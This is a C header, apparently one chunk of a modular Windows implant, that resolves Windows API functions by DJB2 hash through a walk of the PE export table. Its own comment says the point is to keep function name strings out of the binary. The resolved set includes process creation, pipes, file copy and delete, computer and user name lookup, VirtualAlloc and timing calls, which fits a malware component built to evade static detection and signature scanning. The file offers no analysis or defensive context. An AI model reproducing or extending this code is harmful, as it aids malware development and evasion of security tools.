// chunk: api_resolve/api_hash_djb2
// depends: (none)
// provides: djb2_hash, resolve_api, RESOLVED_APIS
// headers: windows.h
// note: DJB2 hash-based API resolution — no function name strings in binary

#ifndef CHUNK_API_HASH_DJB2
#define CHUNK_API_HASH_DJB2

#include <windows.h>

static DWORD djb2_hash(const char *str) {
    DWORD h = 5381;
    int c;
    while ((c = *str++))
        h = ((h << 5) + h) + c;
    return h;
}

static FARPROC resolve_api(HMODULE mod, DWORD hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (djb2_hash(name) == hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

static struct {
    fn_CreateFileA      pCreateFileA;
    fn_ReadFile         pReadFile;
    fn_WriteFile        pWriteFile;
    fn_CloseHandle      pCloseHandle;
    fn_CreateProcessA   pCreateProcessA;
    fn_CopyFileA        pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA      pDeleteFileA;
    fn_CreatePipe       pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize      pGetFileSize;
    fn_GetTempPathA     pGetTempPathA;
    fn_GetComputerNameA pGetComputerNameA;
    fn_GetUserNameA     pGetUserNameA;
    fn_Sleep            pSleep;
    fn_GetTickCount     pGetTickCount;
    fn_VirtualAlloc     pVirtualAlloc;
} api = {0};

static int resolve_all_apis(void) {
    HMODULE k32 = LoadLibraryA("kernel32.dll");
    HMODULE adv = LoadLibraryA("advapi32.dll");
    if (!k32) return 0;

    api.pCreateFileA      = (fn_CreateFileA)resolve_api(k32, 0xeb96c5fa);
    api.pReadFile         = (fn_ReadFile)resolve_api(k32, 0x71019921);
    api.pWriteFile        = (fn_WriteFile)resolve_api(k32, 0x663cecb0);
    api.pCloseHandle      = (fn_CloseHandle)resolve_api(k32, 0x3870ca07);
    api.pCreateProcessA   = (fn_CreateProcessA)resolve_api(k32, 0xaeb52e19);
    api.pCopyFileA        = (fn_CopyFileA)resolve_api(k32, 0xac2253c1);
    api.pGetFileAttributesA = (fn_GetFileAttributesA)resolve_api(k32, 0xcc9c6ccd);
    api.pDeleteFileA      = (fn_DeleteFileA)resolve_api(k32, 0x1cd88719);
    api.pCreatePipe       = (fn_CreatePipe)resolve_api(k32, 0x9a8deee7);
    api.pWaitForSingleObject = (fn_WaitForSingleObject)resolve_api(k32, 0xeccda1ba);
    api.pGetFileSize      = (fn_GetFileSize)resolve_api(k32, 0x7891c520);
    api.pGetTempPathA     = (fn_GetTempPathA)resolve_api(k32, 0x9ef979e9);
    api.pGetComputerNameA = (fn_GetComputerNameA)resolve_api(k32, 0xaa63bfb6);
    api.pGetTickCount     = (fn_GetTickCount)resolve_api(k32, 0x41ad16b9);
    api.pSleep            = (fn_Sleep)resolve_api(k32, 0x0e19e5fe);
    api.pVirtualAlloc     = (fn_VirtualAlloc)resolve_api(k32, 0x382c0f97);

    if (adv)
        api.pGetUserNameA = (fn_GetUserNameA)resolve_api(adv, 0x9bc3ab46);

    return api.pCreateFileA != NULL;
}

#endif
